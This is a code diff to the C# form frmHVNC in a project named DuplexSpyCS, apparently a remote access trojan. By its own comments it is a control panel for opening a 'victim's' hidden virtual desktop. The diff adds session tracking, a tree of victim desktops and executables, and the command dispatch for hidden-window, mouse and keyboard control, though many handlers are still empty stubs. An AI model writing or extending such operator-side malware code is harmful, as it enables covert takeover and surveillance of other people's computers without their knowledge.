@@ -12,6 +12,13 @@ namespace DuplexSpyCS
 {
     public partial class frmHVNC : Form
     {
+        /// <summary>
+        /// HVNC (Hidden Virtual Network Computing) control panel.
+        /// Author: iss4cf0ng/ISSAC
+        /// 
+        /// Obrain victim's machien hidden desktop.
+        /// </summary>
+
         private clsVictim m_victim { get; init; }
 
         public frmHVNC(clsVictim victim)
@@ -22,14 +29,14 @@ namespace DuplexSpyCS
             Text = $@"HVNC\\{m_victim.ID}";
         }
 
-        struct stHvncSession
+        public struct stHvncSession
         {
             public string szDesktopName;
             public string szExeFilePath;
             public string szArguments;
             public TabPage page;
 
-            public bool bIsNull { get { return string.IsNullOrEmpty(szDesktopName) || page == null; } }
+            public bool bIsNull { get { return string.IsNullOrEmpty(szDesktopName); } }
         }
 
         private stHvncSession fnGetSession(TabPage page) => page == null ? new stHvncSession() : (stHvncSession)page.Tag;
@@ -50,36 +57,71 @@ namespace DuplexSpyCS
             if (!clsTools.fnbVictimEquals(victim, m_victim))
                 return;
 
-            if (lsMsg[0] == "hvnc")
+            try
             {
-                
-                if (lsMsg[1] == "window")
+                if (lsMsg[0] == "hvnc")
                 {
-                    if (lsMsg[2] == "init")
+                    if (lsMsg[1] == "window")
                     {
+                        // Hidden window
+
+                        if (lsMsg[2] == "init")
+                        {
+                            var ls2d = clsEZData.fnStrTo2dList(lsMsg[3]);
+                            foreach (var ls in ls2d)
+                            {
+                                stHvncSession session = new stHvncSession()
+                                {
+                                    szDesktopName = ls[0],
+                                    szExeFilePath = ls[1],
+                                    szArguments = string.Empty, // todo
+                                };
+
+                                TabPage? page = fnAddNewPage(session);
+                                if (page == null)
+                                    return;
+
+                                session.page = page;
+
+                                fnAddSession(session);
+                            }
+
+                            Invoke(() =>
+                            {
+                                toolStripStatusLabel1.Text = $"Action successfully. Desktop[{treeView1.Nodes.Count}]";
+                            });
+                        }
+                        else if (lsMsg[2] == "start")
+                        {
+
+                        }
+                        else if (lsMsg[2] == "stop")
+                        {
+
+                        }
+                        else if (lsMsg[2] == "close")
+                        {
+
+                        }
+                    }
+                    else if (lsMsg[1] == "mouse")
+                    {
+                        // Mouse
+
 
                     }
-                    else if (lsMsg[2] == "start")
+                    else if (lsMsg[1] == "keyboard")
                     {
+                        // Keyboard
 
-                    }
-                    else if (lsMsg[2] == "stop")
-                    {
-
-                    }
-                    else if (lsMsg[2] == "close")
-                    {
 
                     }
                 }
-                else if (lsMsg[1] == "mouse")
-                {
-
-                }
-                else if (lsMsg[1] == "keyboard")
-                {
-
-                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                Invoke(() => toolStripStatusLabel1.Text = ex.Message);
             }
         }
 
@@ -89,10 +131,20 @@ namespace DuplexSpyCS
         /// </summary>
         /// <param name="session">HVNC session structure</param>
         /// <returns>Tab page object</returns>
-        TabPage? fnAddNewPage(stHvncSession session)
+        public TabPage? fnAddNewPage(stHvncSession session, bool bShow = true)
         {
+            foreach (TabPage p in tabControl1.TabPages)
+            {
+                var tmp = fnGetSession(p);
+                if (string.Equals(tmp.szDesktopName, session.szDesktopName))
+                    return p;
+            }
+
             TabPage page = new TabPage();
-            tabControl1.TabPages.Add(page);
+
+            if (bShow)
+                tabControl1.TabPages.Add(page);
+
             page.Tag = session;
             session.page = page;
 
@@ -107,10 +159,16 @@ namespace DuplexSpyCS
             };
 
             ToolStripButton btnStop = new ToolStripButton("Stop");
+            btnStop.Click += (s, e) =>
+            {
 
+            };
 
             ToolStripButton btnClose = new ToolStripButton("Close");
+            btnClose.Click += (s, e) =>
+            {
 
+            };
 
             ToolStripComboBox coboxDelay = new ToolStripComboBox();
             coboxDelay.Size = new Size(coboxDelay.Size.Width, 200);
@@ -118,16 +176,32 @@ namespace DuplexSpyCS
             coboxDelay.SelectedIndex = 0;
 
             ToolStripButton btnMouse = new ToolStripButton("Mouse");
+            btnMouse.CheckOnClick = true;
+            btnMouse.Click += (s, e) =>
+            {
 
+            };
 
             ToolStripButton btnKeyboard = new ToolStripButton("Keyboard");
+            btnKeyboard.CheckOnClick = true;
+            btnKeyboard.Click += (s, e) =>
+            {
 
+            };
 
             ToolStripButton btnFPS = new ToolStripButton("FPS");
+            btnFPS.CheckOnClick = true;
+            btnFPS.Click += (s, e) =>
+            {
 
+            };
 
             ToolStripButton btnTs = new ToolStripButton("Timestamp");
+            btnTs.CheckOnClick = true;
+            btnTs.Click += (s, e) =>
+            {
 
+            };
 
             ToolStrip ts = new ToolStrip();
             ts.Items.AddRange(new ToolStripItem[]
@@ -160,6 +234,26 @@ namespace DuplexSpyCS
             return page;
         }
 
+        /// <summary>
+        /// Add new session into treeview.
+        /// </summary>
+        /// <param name="session"></param>
+        /// <returns>Added treeNode</returns>
+        TreeNode fnAddSession(stHvncSession session)
+        {
+            TreeNode? node = clsTools.fnFindTreeNode(treeView1.Nodes, session.szDesktopName);
+            if (node == null)
+            {
+                node = new TreeNode(session.szDesktopName);
+                treeView1.Nodes.Add(node);
+            }
+
+            TreeNode nodeApp = new TreeNode(session.szExeFilePath);
+            node.Nodes.Add(nodeApp);
+
+            return nodeApp;
+        }
+
         void fnSetup()
         {
             toolStripStatusLabel1.Text = $"Initializing...";
@@ -174,7 +268,7 @@ namespace DuplexSpyCS
             {
                 "hvnc",
                 "window",
-                "init",
+                "init", // Initialization
             });
         }
 
@@ -238,7 +332,18 @@ namespace DuplexSpyCS
         // Add
         private void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
+            frmHvncAdd f = new frmHvncAdd(this);
+            f.ShowDialog();
 
+            var session = f.m_stConfig;
+            if (session.bIsNull)
+            {
+                MessageBox.Show("Name cannot be null or empty.", "Invalid name", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            TreeNode node = fnAddSession(session);
+            treeView1.SelectedNode = node;
         }
 
         // Close
@@ -249,6 +354,30 @@ namespace DuplexSpyCS
 
         // Close All
         private void toolStripMenuItem3_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        // Start
+        private void toolStripMenuItem4_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        // Start All
+        private void toolStripMenuItem5_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        // Stop
+        private void toolStripMenuItem6_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        // Stop All
+        private void toolStripMenuItem7_Click(object sender, EventArgs e)
         {
 
         }
